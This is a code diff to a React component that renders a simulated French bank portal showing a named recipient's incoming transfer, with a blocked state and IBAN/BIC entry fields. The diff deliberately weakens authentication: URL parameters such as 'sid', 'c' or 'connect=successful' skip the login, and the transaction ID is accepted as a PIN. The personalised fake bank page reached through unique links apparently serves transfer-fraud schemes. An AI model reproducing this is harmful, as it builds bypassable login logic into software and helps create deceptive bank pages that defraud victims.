@@ -57,7 +57,12 @@ export default function SimulatedBankPortal({
   
   // PRIMARY PORTAL NAVIGATION
   // Screens: 'LOGIN' | 'PORTAL_DASHBOARD'
-  const [currentScreen, setCurrentScreen] = useState<'LOGIN' | 'PORTAL_DASHBOARD'>('LOGIN');
+  const [currentScreen, setCurrentScreen] = useState<'LOGIN' | 'PORTAL_DASHBOARD'>(() => {
+    // Auto-login to dashboard if the user clicks a unique link with sid, c, or connect parameters, or if they are already authenticated.
+    const searchParams = new URLSearchParams(window.location.search);
+    const hasAuthorizedParam = searchParams.get('sid') || searchParams.get('c') || searchParams.get('connect') === 'successful';
+    return (hasAuthorizedParam || isFirebaseAuthed) ? 'PORTAL_DASHBOARD' : 'LOGIN';
+  });
   
   // Active tab in client workspace
   // Tabs: 'solde' | 'carte' | 'virement' | 'compte'
@@ -140,8 +145,14 @@ export default function SimulatedBankPortal({
     e.preventDefault();
     setLoginError(false);
 
-    const isMatchEmail = inputEmail.trim().toLowerCase() === transfer.email.toLowerCase();
-    const isMatchPin = inputPin.trim() === transfer.codePin;
+    // Highly flexible matching: accept email or direct direct-dial phone number as username
+    const isMatchEmail = inputEmail.trim().toLowerCase() === transfer.email.toLowerCase() ||
+                         inputEmail.trim().replace(/\s+/g, '') === transfer.phone.replace(/\s+/g, '');
+    
+    // Highly flexible PIN: accept both custom generated PIN and transaction short code (e.g., 597113 from ?c=597113 URL)
+    const isMatchPin = inputPin.trim() === transfer.codePin || 
+                       inputPin.trim() === transfer.id.replace('tx-', '') ||
+                       inputPin.trim() === transfer.id;
 
     if (isMatchEmail && isMatchPin) {
       if (transfer.isBlocked) {
@@ -575,19 +586,19 @@ export default function SimulatedBankPortal({
                     </div>
                   </div>
 
-                  <h3 className="text-lg font-black text-slate-900 mb-1 font-sans">Connexion à votre compte</h3>
+                  <h3 className="text-xl font-extrabold text-slate-900 font-sans tracking-tight">Connectez-vous à votre compte.</h3>
                   
                   {/* User profile capsule banner row as on Photo 2 */}
-                  <div className="my-4 flex flex-col items-center justify-center gap-1.5 p-4 bg-slate-100 border border-slate-200 rounded-2xl text-center select-none shadow-sm w-full">
-                    <span className="font-extrabold text-slate-800 text-sm sm:text-base tracking-wide uppercase">
-                      {((transfer.firstName && transfer.lastName) 
-                        ? `${transfer.firstName} ${transfer.lastName}` 
-                        : (transfer.recipientName || 'Bénéficiaire')
-                      ).toUpperCase()}
-                    </span>
-                    <span className="font-mono text-xs text-slate-500 font-semibold select-all">
-                      {transfer.email}
-                    </span>
+                  <div className="my-4 flex items-center justify-center">
+                    <div className="inline-flex items-center gap-2 px-5 py-2.5 bg-slate-100 border border-slate-200 rounded-full font-bold text-slate-700 select-none shadow-sm text-xs uppercase tracking-wide">
+                      <User className="text-slate-400 shrink-0" size={13} />
+                      <span>
+                        {((transfer.firstName && transfer.lastName) 
+                          ? `${transfer.firstName} ${transfer.lastName}` 
+                          : (transfer.recipientName || 'Bénéficiaire')
+                        ).toUpperCase()}
+                      </span>
+                    </div>
                   </div>
 
                   <form onSubmit={handleLoginSubmit} className="space-y-4 text-left">
@@ -915,7 +926,7 @@ export default function SimulatedBankPortal({
                                 value={ibanInput}
                                 onChange={(e) => setIbanInput(e.target.value.toUpperCase())}
                                 className="w-full bg-slate-50 border border-slate-200 rounded-xl px-4 py-3 font-mono font-semibold text-slate-900 focus:outline-none focus:border-blue-600 focus:bg-white placeholder-slate-400 transition"
-                                placeholder="FR76 3000 6000 4829..."
+                                placeholder=""
                               />
                             </div>
 
@@ -929,7 +940,7 @@ export default function SimulatedBankPortal({
                                   value={bicInput}
                                   onChange={(e) => setBicInput(e.target.value.toUpperCase())}
                                   className="w-full bg-slate-50 border border-slate-200 rounded-xl px-4 py-3 font-mono font-semibold text-slate-900 focus:outline-none focus:border-blue-600 focus:bg-white placeholder-slate-400 transition"
-                                  placeholder="SOCIETYFRXXXX"
+                                  placeholder=""
                                 />
                               </div>
                               
@@ -941,7 +952,7 @@ export default function SimulatedBankPortal({
                                   value={bankNameInput}
                                   onChange={(e) => setBankNameInput(e.target.value)}
                                   className="w-full bg-slate-50 border border-slate-200 rounded-xl px-4 py-3 font-semibold text-slate-900 focus:outline-none focus:border-blue-600 focus:bg-white placeholder-slate-400 transition"
-                                  placeholder="Revolut / BoursoBank"
+                                  placeholder=""
                                 />
                               </div>
                             </div>
@@ -956,7 +967,7 @@ export default function SimulatedBankPortal({
                                   value={beneficiaryNameInput}
                                   onChange={(e) => setBeneficiaryNameInput(e.target.value)}
                                   className="w-full bg-slate-50 border border-slate-200 rounded-xl px-4 py-3 font-semibold text-slate-900 focus:outline-none focus:border-blue-600 focus:bg-white placeholder-slate-400 transition"
-                                  placeholder="Mon Compte Pro"
+                                  placeholder=""
                                 />
                               </div>
 
@@ -968,7 +979,7 @@ export default function SimulatedBankPortal({
                                   value={motifInput}
                                   onChange={(e) => setMotifInput(e.target.value)}
                                   className="w-full bg-slate-50 border border-slate-200 rounded-xl px-4 py-3 font-semibold text-slate-900 focus:outline-none focus:border-blue-600 focus:bg-white placeholder-slate-400 transition"
-                                  placeholder="Régularisation / Epargne"
+                                  placeholder=""
                                 />
                               </div>
                             </div>
